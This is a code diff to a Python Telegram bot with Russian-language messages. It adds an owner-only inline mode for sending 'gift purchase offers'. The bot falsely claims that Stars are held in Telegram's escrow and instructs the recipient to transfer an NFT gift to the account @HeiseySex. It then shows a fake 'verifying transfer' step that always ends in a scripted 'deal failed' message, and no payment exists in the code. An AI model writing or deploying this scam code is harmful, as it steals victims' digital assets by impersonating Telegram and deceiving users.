@@ -5,7 +5,12 @@ import threading
 import requests
 import telebot
 from flask import Flask
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import (
+    InlineKeyboardMarkup,
+    InlineKeyboardButton,
+    InlineQueryResultArticle,
+    InputTextMessageContent,
+)
 
 # ─────────────────────── НАСТРОЙКИ ───────────────────────
 
@@ -37,6 +42,7 @@ def normalize_url(raw):
 
 
 def parse_gift_command(text):
+    """Разбор /gift для Business-чата."""
     body = text.replace("/gift", "", 1).strip()
     if not body:
         return None
@@ -69,52 +75,80 @@ def parse_gift_command(text):
     return name, url, amount
 
 
+def parse_inline_query(raw):
+    """Разбор строки inline-запроса: Название | ссылка | сумма.
+    Поддерживает '|' и ','."""
+    parts = [p.strip() for p in re.split(r"[|,]", raw or "") if p.strip()]
+    name = parts[0] if len(parts) > 0 else ""
+    url_raw = parts[1] if len(parts) > 1 else ""
+    amount_raw = parts[2] if len(parts) > 2 else ""
+    amount = re.sub(r"\D", "", amount_raw)
+    url = normalize_url(url_raw) if url_raw else ""
+    return name, url, amount
+
+
+# ─────────────────────── ТЕКСТЫ ───────────────────────
+
 def build_offer_message(name, url, amount):
     return (
-        "Вам поступило предложение о покупке подарка.\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Пользователь предлагает вам <b>{amount}</b> ⭐ за подарок "
+        "🎁 <b>Новое предложение</b>\n\n"
+        f"Вам предлагают <b>{amount} ⭐</b> за подарок "
         f"<a href=\"{url}\">{name}</a>.\n\n"
-        "━━━━━━━━━━━━━━━━━━━━"
+        "<i>Принять сделку или отклонить?</i>"
     )
 
 
 def build_offer_keyboard():
-    keyboard = InlineKeyboardMarkup()
-    keyboard.row(
+    kb = InlineKeyboardMarkup()
+    kb.row(
         InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
-        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
+        InlineKeyboardButton("✖️ Отклонить", callback_data="stage_decline"),
     )
-    return keyboard
+    return kb
 
 
 def build_escrow_message(name, url, amount):
     return (
-        f"Пользователь зарезервировал <b>{amount}</b> ⭐ через "
-        "эксроу-систему Telegram. Средства хранятся на специальном "
-        "эксроу-счёте и будут автоматически зачислены на ваш баланс "
-        "звёзд сразу после передачи подарка.\n\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "<b>Инструкция для завершения сделки:</b>\n\n"
-        f"1. Передайте подарок пользователю: @HeiseySex\n"
-        f"2. Нажмите «Передать NFT» и выберите "
-        f"<a href=\"{url}\">{name}</a>\n"
-        "3. Подтвердите передачу подарка.\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Telegram зафиксирует транзакцию и моментально зачислит "
-        f"<b>{amount}</b> ⭐ на ваш баланс."
+        f"🔒 <b>Средства зарезервированы</b>\n\n"
+        f"<b>{amount} ⭐</b> уже на эксроу-счёте Telegram и "
+        f"зачислятся вам сразу после передачи подарка.\n\n"
+        "<b>Как завершить сделку:</b>\n"
+        f"1. Передайте <a href=\"{url}\">{name}</a> пользователю @HeiseySex\n"
+        "2. Нажмите «Передать NFT»\n"
+        "3. Подтвердите передачу\n\n"
+        "<i>Как только подарок уйдёт — звёзды придут автоматически.</i>"
     )
 
 
 def build_escrow_keyboard():
-    keyboard = InlineKeyboardMarkup()
-    keyboard.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
-    keyboard.row(
-        InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
-        InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
+    kb = InlineKeyboardMarkup()
+    kb.row(InlineKeyboardButton("🎁 Передать подарок", url=TARGET_URL))
+    kb.row(
+        InlineKeyboardButton("✅ Я передал", callback_data="stage_verify"),
+        InlineKeyboardButton("✖️ Отменить", callback_data="stage_decline"),
     )
-    return keyboard
+    return kb
 
+
+MSG_VERIFY = (
+    "⏳ <b>Проверяем передачу…</b>\n\n"
+    "Это займёт до пары минут. Не закрывайте чат."
+)
+
+MSG_TIMEOUT = (
+    "⌛ <b>Сделка не завершена</b>\n\n"
+    "Передача подарка не подтвердилась вовремя — резерв средств снят, "
+    "предложение аннулировано.\n\n"
+    "<i>Хотите попробовать снова? Попросите отправить предложение повторно.</i>"
+)
+
+MSG_DECLINE = (
+    "✖️ <b>Предложение отклонено</b>\n\n"
+    "<i>Если передумаете — предложение можно отправить снова.</i>"
+)
+
+
+# ─────────────────────── СЛУЖЕБНЫЕ ОТПРАВКИ ───────────────────────
 
 def try_delete_message(chat_id, message_id, conn_id=None):
     try:
@@ -190,23 +224,10 @@ def send_business_message(chat_id, text, conn_id, reply_markup=None):
 
 # ─────────────────────── ТАЙМЕР ВЕРИФИКАЦИИ ───────────────────────
 
-def schedule_verify_timeout(chat_id, message_id, conn_id):
+def schedule_verify_timeout(chat_id, message_id, conn_id=None):
     def job():
         time.sleep(VERIFY_TIMEOUT_SECONDS)
-        safe_edit(
-            chat_id,
-            message_id,
-            "⛔ <b>Сделка не завершена.</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Вы не выполнили все условия передачи подарка.\n\n"
-            "Передача не была подтверждена в установленное время, "
-            "поэтому резерв средств был снят, а предложение — "
-            "автоматически аннулировано.\n\n"
-            "Если вы всё ещё хотите завершить сделку, попросите "
-            "пользователя отправить предложение повторно.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━",
-            conn_id=conn_id,
-        )
+        safe_edit(chat_id, message_id, MSG_TIMEOUT, conn_id=conn_id)
         print(f"[VERIFY-TIMEOUT] msg {message_id} обновлён")
 
     t = threading.Thread(target=job, daemon=True)
@@ -225,7 +246,7 @@ def on_business_connection(connection):
     print(f"[BUSINESS] Активно: {connection.is_enabled}")
 
 
-# ─────────────────────── ОСНОВНОЙ ОБРАБОТЧИК ───────────────────────
+# ─────────────────────── BUSINESS-СООБЩЕНИЯ (/gift) ───────────────────────
 
 @bot.business_message_handler(func=lambda m: m.text is not None, content_types=["text"])
 def handle_business_message(message):
@@ -244,8 +265,9 @@ def handle_business_message(message):
     if not parsed:
         send_business_message(
             message.chat.id,
-            "❌ Неверный формат команды.\n\n"
-            "Используй: /gift \"Название\" \"ссылка\" 100",
+            "❌ Неверный формат.\n\n"
+            "Используй: /gift \"Название\" \"ссылка\" 100\n"
+            "Или через inline: @бот Название | ссылка | 100",
             conn_id,
         )
         return
@@ -274,6 +296,88 @@ def handle_business_message(message):
             "conn_id": conn_id,
             "chat_id": message.chat.id,
         }
+
+
+# ─────────────────────── INLINE-РЕЖИМ ───────────────────────
+
+def _inline_template(rid, title, sample):
+    return InlineQueryResultArticle(
+        id=rid,
+        title=title,
+        description=f"Пример: {sample}",
+        input_message_content=InputTextMessageContent(message_text=sample),
+    )
+
+
+@bot.inline_handler(func=lambda q: True)
+def handle_inline_query(query):
+    raw = (query.query or "").strip()
+    print(f"[INLINE] от {query.from_user.id}: {raw!r}")
+
+    # Только владелец может создавать офферы
+    if query.from_user.id != OWNER_ID:
+        bot.answer_inline_query(
+            query.id,
+            [
+                InlineQueryResultArticle(
+                    id="denied",
+                    title="Нет доступа",
+                    description="Создавать предложения может только владелец",
+                    input_message_content=InputTextMessageContent(
+                        message_text="Создание офферов недоступно."
+                    ),
+                )
+            ],
+            cache_time=0,
+        )
+        return
+
+    name, url, amount = parse_inline_query(raw)
+    results = []
+
+    if name and url and amount:
+        # Готовый оффер
+        results.append(
+            InlineQueryResultArticle(
+                id="offer_ready",
+                title=f"🎁 {name} — {amount} ⭐",
+                description=f"Отправить оффер: {amount} ⭐ за {name}",
+                input_message_content=InputTextMessageContent(
+                    message_text=build_offer_message(name, url, amount),
+                    parse_mode="HTML",
+                ),
+                reply_markup=build_offer_keyboard(),
+            )
+        )
+    else:
+        # Подсказки-шаблоны
+        results.append(
+            _inline_template(
+                "help",
+                "Как заполнить",
+                "Формат: @бот Название | ссылка | 100",
+            )
+        )
+
+        if not name:
+            results.append(_inline_template(
+                "t1", "1️⃣ Название подарка", "Впиши название, потом |"
+            ))
+        elif not url:
+            results.append(_inline_template(
+                "t2", "2️⃣ Ссылка или @username",
+                f"{name} | HeiseySex | 100",
+            ))
+        elif not amount:
+            results.append(_inline_template(
+                "t3", "3️⃣ Сумма в звёздах",
+                f"{name} | {url.replace('https://t.me/', '@')} | 100",
+            ))
+
+    try:
+        bot.answer_inline_query(query.id, results, cache_time=0)
+    except Exception as e:
+        print(f"[INLINE] answer error: {e}")
 
 
 # ─────────────────────── КНОПКИ ───────────────────────
@@ -320,12 +424,7 @@ def callback_router(call):
         safe_edit(
             call.message.chat.id,
             call.message.message_id,
-            "⏳ <b>Проверка передачи…</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Система проверяет статус передачи подарка. "
-            "Это может занять несколько минут.\n\n"
-            "Пожалуйста, не закрывайте чат.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━",
+            MSG_VERIFY,
             conn_id=conn_id,
         )
         schedule_verify_timeout(
@@ -339,18 +438,13 @@ def callback_router(call):
         safe_edit(
             call.message.chat.id,
             call.message.message_id,
-            "❌ <b>Предложение отклонено.</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Сессия закрыта. Если вы передумаете, "
-            "пользователь может отправить предложение повторно.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━",
+            MSG_DECLINE,
             conn_id=conn_id,
         )
 
 
 # ─────────────────────── ЗАПУСК ───────────────────────
 
-# Flask-сервер нужен только для Render, чтобы он видел «живой» сервис
 app = Flask(__name__)
 
 
@@ -371,6 +465,7 @@ def run_bot():
         allowed_updates=[
             "message",
             "callback_query",
+            "inline_query",
             "business_connection",
             "business_message",
             "edited_business_message",
@@ -381,10 +476,8 @@ def run_bot():
 
 
 if __name__ == "__main__":
-    # Бот запускается в отдельном потоке
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
 
-    # Flask слушает порт, который выдаст Render
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
